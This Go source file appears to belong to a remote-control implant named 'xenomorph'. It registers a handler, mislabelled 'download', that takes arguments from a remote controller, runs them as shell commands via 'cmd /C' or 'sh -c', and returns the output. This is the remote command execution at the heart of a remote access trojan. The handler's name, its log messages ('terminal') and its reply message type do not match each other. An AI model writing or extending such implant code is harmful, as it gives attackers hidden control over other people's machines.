package command

import (
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"go.uber.org/zap"
)

func initDownloadCommand() {
	err := commandHandler.AddCommand("download", func(client types.ClientController, msgID uint32, command types.Command) {
		logger.L().Info("Received 'terminal' command", zap.String("command", command.Name), zap.Strings("args", command.Args))

		if len(command.Args) == 0 {
			response := types.CommandResponse{
				ID:     command.ID,
				Output: "",
				Error:  "No command specified",
			}
			client.Send(types.MsgCommandResponse, 0, msgID, []byte(response.ToJSON()))
			return
		}

		// Combine the command into a single string for shell execution
		cmdStr := strings.Join(command.Args, " ")

		var execCmd *exec.Cmd
		if runtime.GOOS == "windows" {
			execCmd = exec.Command("cmd", "/C", cmdStr)
		} else {
			execCmd = exec.Command("sh", "-c", cmdStr)
		}

		start := time.Now()
		output, err := execCmd.CombinedOutput()
		duration := time.Since(start).Milliseconds()

		resp := types.CommandResponse{
			ID:       command.ID,
			Output:   string(output),
			Error:    "",
			Duration: duration,
		}

		if err != nil {
			resp.Error = err.Error()
			logger.L().Error("Terminal command failed", zap.Error(err), zap.String("cmd", cmdStr))
		} else {
			logger.L().Info("Terminal command succeeded", zap.String("cmd", cmdStr), zap.String("output", strings.TrimSpace(string(output))))
		}

		client.Send(types.MsgFileStart, 0, msgID, []byte(resp.ToJSON()))
	})

	if err != nil {
		logger.L().Error("Failed to register 'terminal' command handler", zap.Error(err))
	}
}
